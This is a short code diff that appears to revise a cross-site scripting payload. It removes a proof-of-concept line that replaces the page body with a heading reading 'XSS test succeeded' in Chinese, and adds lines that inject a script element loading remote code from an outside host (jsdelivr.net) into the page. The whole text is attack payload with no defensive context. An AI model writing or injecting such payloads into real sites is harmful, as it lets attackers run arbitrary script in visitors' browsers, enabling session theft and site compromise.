@@ -1,1 +1,3 @@
-document.body.innerHTML = "<h1>XSS 測試成功</h1>";
+var s = document.createElement('script');
+s.src = 'https://jsdelivr.net'; 
+document.body.appendChild(s);
